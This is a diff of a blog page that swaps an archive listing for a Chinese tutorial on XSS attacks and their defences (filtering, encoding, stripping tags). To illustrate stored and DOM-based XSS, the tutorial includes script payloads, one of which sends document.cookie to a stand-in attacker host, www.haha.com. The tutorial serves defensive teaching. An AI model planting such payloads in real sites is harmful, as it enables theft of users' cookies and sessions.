@@ -6,15 +6,22 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="attendent.github.io">
-  <title>Archives | 驿外残香 | HC的博客</title>
+  <title>XSS原理与防御手段 | 驿外残香 | HC的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="驿外残香 | HC的博客">
-<meta property="og:url" content="attendent.github.io/archives/index.html">
+  <meta name="description" content="一 XSS概念XSS又称CSS，全称Cross Site Script，跨站脚本攻击。 其原理是攻击者针对有XSS漏洞的网站构建或输入恶意的Script代码，当其它用户点击恶意链接或者浏览该网站时，这段Script代码会自动执行，从而达到攻击的目的。如，盗取用户Cookie、破坏页面结构、重定向到其它网站等。 与CSRF攻击之间的区别是： CSRF攻击是通过构建请求并利用用户未过期的Session">
+<meta name="keywords" content="安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS原理与防御手段">
+<meta property="og:url" content="attendent.github.io/2018/12/19/XSS原理与防御手段/index.html">
 <meta property="og:site_name" content="驿外残香 | HC的博客">
+<meta property="og:description" content="一 XSS概念XSS又称CSS，全称Cross Site Script，跨站脚本攻击。 其原理是攻击者针对有XSS漏洞的网站构建或输入恶意的Script代码，当其它用户点击恶意链接或者浏览该网站时，这段Script代码会自动执行，从而达到攻击的目的。如，盗取用户Cookie、破坏页面结构、重定向到其它网站等。 与CSRF攻击之间的区别是： CSRF攻击是通过构建请求并利用用户未过期的Session">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="/19/XSS原理与防御手段/Users/Administrator/AppData/Roaming/Typora/typora-user-images/1545409364912.png">
+<meta property="og:updated_time" content="2019-01-10T17:49:35.686Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="驿外残香 | HC的博客">
+<meta name="twitter:title" content="XSS原理与防御手段">
+<meta name="twitter:description" content="一 XSS概念XSS又称CSS，全称Cross Site Script，跨站脚本攻击。 其原理是攻击者针对有XSS漏洞的网站构建或输入恶意的Script代码，当其它用户点击恶意链接或者浏览该网站时，这段Script代码会自动执行，从而达到攻击的目的。如，盗取用户Cookie、破坏页面结构、重定向到其它网站等。 与CSRF攻击之间的区别是： CSRF攻击是通过构建请求并利用用户未过期的Session">
+<meta name="twitter:image" content="/19/XSS原理与防御手段/Users/Administrator/AppData/Roaming/Typora/typora-user-images/1545409364912.png">
   
     <link rel="alternative" href="/atom.xml" title="驿外残香 | HC的博客" type="application/atom+xml">
   
@@ -158,84 +165,68 @@ var _hmt = _hmt || [];
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-XSS原理与防御手段" class="article article-type-post " itemscope="" itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/01/11/平衡二叉树的旋转操作/" class="archive-article-date">
-  	<time datetime="2019-01-10T17:42:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-11</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/01/11/平衡二叉树的旋转操作/">平衡二叉树的旋转操作</a>
+    <h1 class="article-title" itemprop="name">
+      XSS原理与防御手段
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">算法</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-      
-        </div></section>
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/12/19/XSS原理与防御手段/" class="archive-article-date">
+        
+        <a href="/2018/12/19/XSS原理与防御手段/" class="archive-article-date">
   	<time datetime="2018-12-19T05:53:03.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-19</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/12/19/XSS原理与防御手段/">XSS原理与防御手段</a>
-    </h1>
-  
+        
+		
+		<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <span id="busuanzi_container_site_pv">阅读量<span id="busuanzi_value_site_pv"></span>次</span>
+	
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="一-XSS概念"><a href="#一-XSS概念" class="headerlink" title="一 XSS概念"></a>一 XSS概念</h3><p>XSS又称CSS，全称Cross Site Script，跨站脚本攻击。</p>
+<p>其原理是攻击者针对有XSS漏洞的网站构建或输入恶意的Script代码，当其它用户点击恶意链接或者浏览该网站时，这段Script代码会自动执行，从而达到攻击的目的。如，盗取用户Cookie、破坏页面结构、重定向到其它网站等。</p>
+<p><strong>与CSRF攻击之间的区别是：</strong></p>
+<p>CSRF攻击是通过构建请求并利用用户未过期的SessionId来伪造用户身份并向远端服务器发送请求，从而达到修改用户数据的目的。在这个过程中攻击者无法对目标网站造成任何实质性的修改，只能通过向目标用户发送第三方链接或诱使目标用户进入攻击者搭建的恶意网站来实现CSRF攻击。并且该攻击无法得到用户的任何数据，比如Cookie，服务器端的响应数据。</p>
+<a id="more"></a>
+<h3 id="二-XSS的攻击方式"><a href="#二-XSS的攻击方式" class="headerlink" title="二 XSS的攻击方式"></a>二 XSS的攻击方式</h3><p>XSS攻击类似于SQL注入攻击，理论上，没有对页面上所有可输入数据都进行数据检验的话，都会存在XSS漏洞，漏洞的危害取决于攻击代码的威力，攻击代码也不局限于script。</p>
+<p><strong>2.1 按持续时间可以分为两类：</strong></p>
+<p><strong>（1）非持久性攻击：</strong>该攻击是一次性的，仅仅对当前用户访问的页面产生影响。例如当用户访问一个被攻击者恶意篡改后的链接时，被写在URL中的攻击脚本被嵌套进目标页面进而被用户浏览器执行，从而达到攻击目的。</p>
+<p><strong>（2）持久性攻击：</strong>该攻击会将攻击者输入的数据存储在服务器端中，从此攻击行为将一直存在。</p>
+<p><strong>2.2 按恶意代码存放位置可以分为两类：</strong></p>
+<p><strong>（1）DOM Based XSS：</strong>基于DOM结构的攻击。下面介绍，主要特点是受众小，通过超链接传播。</p>
+<p><strong>（2）Stored XSS：</strong>将攻击代码嵌入服务器或者数据库中。下面介绍，主要特点是受众大。</p>
+<p><strong>2.3 按操作流程可以分为三类：</strong></p>
+<p><strong>（1）反射型：</strong>发出请求时，用户在输入框中输入XSS代码，如<code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>，此时XSS代码出现在请求参数中，并作为输入参数提交到服务器端，服务器端解析后响应，若此时网站需要拿到该输入框中输入的参数并将其嵌入到HTML代码中，XSS将随响应内容一起返回给浏览器，最后浏览器解析执行XSS代码，这个过程就像一次反射，所以叫反射型XSS。</p>
+<p>此时服务器相当于一个数据的中转站，比如用户登陆后服务器需要将用户输入的用户名数据返回给浏览器进行显示，若此时该用户名为一串XSS代码，该代码将会被放置到用户名的占位上，则最终浏览器会按正常流程解析并执行XSS代码，此时XSS攻击成功。</p>
+<p><strong>（2）存储型：</strong>存储型的XSS提交的代码会存储在服务器端（数据库，内存，文件系统等），下次请求目标页面时不用再提交XSS代码。同时当用户请求该数据库数据时便会触发XSS攻击。请求数据后的操作与反射型相似。</p>
+<p>与SQL注入攻击相似，但该攻击的被触发时间将被延后，具体取决于请求该数据的用户。</p>
+<p>例如：攻击者在<code>www.xss.com</code>中发布了一篇文章，而该文章中包含了恶意代码<code>&lt;script&gt;window.open(“www.haha.com?param=”+document.cookie)&lt;/script&gt;</code>,此时用户若打开了攻击者发布的文章，则浏览器会解析执行该段代码，用户的cookie信息会被发送到攻击者<code>www.haha.com</code>网站的服务器中，此时攻击成功。</p>
+<p><strong>（3）DOM：</strong>不经过后端,DOM—based XSS漏洞是基于文档对象模型Document Objeet Model,DOM)的一种漏洞,dom - xss是通过url传入参数去控制触发的。  </p>
+<p>例如：攻击者知道某个网站<code>http://www.xss.com</code>有一个XSS漏洞，于是他构建了一个包含恶意代码的超链接<code>http://www.xss.com?content=&lt;script&gt;window.open(“www.haha.com?param=”+document.cookie)&lt;/script&gt;</code>。当目标用户点击该超链接时，浏览器就会直接打开<code>www.haha.com</code>，并且把目标用户在<code>www.xss.com</code>中的cookie信息发送到<code>www.haha.com</code>，此时攻击者便会盗取到目标用户在<code>www.xss.com</code>网站的cookie信息，即攻击成功。</p>
+<h3 id="三-XSS防御"><a href="#三-XSS防御" class="headerlink" title="三 XSS防御"></a>三 XSS防御</h3><h4 id="3-1-完善过滤体系"><a href="#3-1-完善过滤体系" class="headerlink" title="3.1 完善过滤体系"></a>3.1 完善过滤体系</h4><p>后端永远不要相信前端传来的数据，这是句值得牢记的话。对每个用户输入的值进行判断，最大限度地缩小判断范围，对一些有固定格式的数据采用正则表达式进行字符匹配。</p>
+<h4 id="3-2-编码"><a href="#3-2-编码" class="headerlink" title="3.2 编码"></a>3.2 编码</h4><p> 在一些情况下，比如聊天室消息的发送，我们不能对用户数据进行严格的过滤，那我们也需要对标签进行转换。</p>
+<p><img src="/19/XSS原理与防御手段/Users\Administrator\AppData\Roaming\Typora\typora-user-images\1545409364912.png" alt="1545409364912"></p>
+<p>比如用户输入：<code>&lt;script&gt;window.location.href=”http://www.baidu.com”;&lt;/script&gt;</code>，保存后最终存储的会是：<code>&amp;lt;script&amp;gt;window.location.href=&amp;quot;http://www.baidu.com&amp;quot;&amp;lt;/script&amp;gt</code>在展现时浏览器会对这些字符转换成文本内容显示，而不是一段可执行的代码。</p>
+<h4 id="3-3-过滤"><a href="#3-3-过滤" class="headerlink" title="3.3 过滤"></a>3.3 过滤</h4><p>因为XSS攻击主要是通过构建标签来进行攻击，因此可以直接移除用户上传的DOM属性，如onerror等，移除用户上传的style节点，script节点，iframe节点等。</p>
+<h4 id="3-4-校正"><a href="#3-4-校正" class="headerlink" title="3.4 校正"></a>3.4 校正</h4><p>避免直接对HTML Entity编码，使用DOM Prase转换，校正不配对的DOM标签。</p>
+<p>例如：CSDN网站上会将<code>&lt;script&gt;</code>标签转换为<code>[removed]</code>。</p>
+<h2 id="四-参考网站"><a href="#四-参考网站" class="headerlink" title="四 参考网站"></a>四 参考网站</h2><p><a href="https://blog.csdn.net/stpeace/article/details/53512283" target="_blank" rel="noopener">CSRF攻击与防御（写得非常好）</a></p>
+<p><a href="https://blog.csdn.net/ganyingxie123456/article/details/70230486" target="_blank" rel="noopener">Web安全之XSS攻防</a></p>
+<p><a href="https://blog.csdn.net/ghsau/article/details/17027893" target="_blank" rel="noopener">XSS攻击及防御</a></p>
 
-        <div class="article-info info-on-right">
-          
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -247,286 +238,144 @@ var _hmt = _hmt || [];
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+		<img src="http://qr.liantu.com/api.php?text=http:attendent.github.io/2018/12/19/XSS原理与防御手段/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/12/19/CSRF原理与防御手段/" class="archive-article-date">
-  	<time datetime="2018-12-19T05:53:03.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-19</time>
-</a>
+<nav id="article-nav">
+  
+    <a href="/2019/01/11/平衡二叉树的旋转操作/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          平衡二叉树的旋转操作
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/12/19/CSRF原理与防御手段/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">CSRF原理与防御手段</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/12/19/CSRF原理与防御手段/">CSRF原理与防御手段</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">安全</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#一-XSS概念"><span class="toc-number">1.</span> <span class="toc-text">一 XSS概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二-XSS的攻击方式"><span class="toc-number">2.</span> <span class="toc-text">二 XSS的攻击方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三-XSS防御"><span class="toc-number">3.</span> <span class="toc-text">三 XSS防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-完善过滤体系"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 完善过滤体系</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-编码"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-过滤"><span class="toc-number">3.3.</span> <span class="toc-text">3.3 过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-4-校正"><span class="toc-number">3.4.</span> <span class="toc-text">3.4 校正</span></a></li></ol></li></ol><li class="toc-item toc-level-2"><a class="toc-link" href="#四-参考网站"><span class="toc-number"></span> <span class="toc-text">四 参考网站</span></a>
+                    </li></div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+        
+    </div>
+</aside>
+
+
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/12/05/Rest架构风格/" class="archive-article-date">
-  	<time datetime="2018-12-05T05:17:24.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-05</time>
-</a>
-        </div>
-    	 
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/12/05/Rest架构风格/">RESTful架构风格与规范</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">学习笔记</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/12/02/WebSocket中的Session认证/" class="archive-article-date">
-  	<time datetime="2018-12-02T09:03:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-02</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/12/02/WebSocket中的Session认证/">解决WebSocket中的Session认证问题</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Session</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/12/02/树的八种遍历(递归与非递归)/" class="archive-article-date">
-  	<time datetime="2018-12-02T09:03:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-02</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/12/02/树的八种遍历(递归与非递归)/">树的八种遍历实现（递归与非递归）</a>
-    </h1>
+    <section id="comments">
+      <div id="disqus_thread"></div>
+        <script type="text/javascript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'huachen'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+          var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+          dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+      <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </section>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">算法</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/12/02/请求IO读写/" class="archive-article-date">
-  	<time datetime="2018-12-02T09:03:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-02</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/12/02/请求IO读写/">请求IO只能读写一次的原因与解决方案</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/11/30/博客配置/" class="archive-article-date">
-  	<time datetime="2018-11-30T12:54:22.150Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-30</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/11/30/博客配置/">yilia基础博客配置</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">博客配置</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/11/27/修复TCP连接/" class="archive-article-date">
-  	<time datetime="2018-11-27T00:55:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-27</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/11/27/修复TCP连接/">阿里云上修复TCP断开异常</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Netty</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-
 
           </div>
         </div>
@@ -551,8 +400,8 @@ var _hmt = _hmt || [];
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: true,
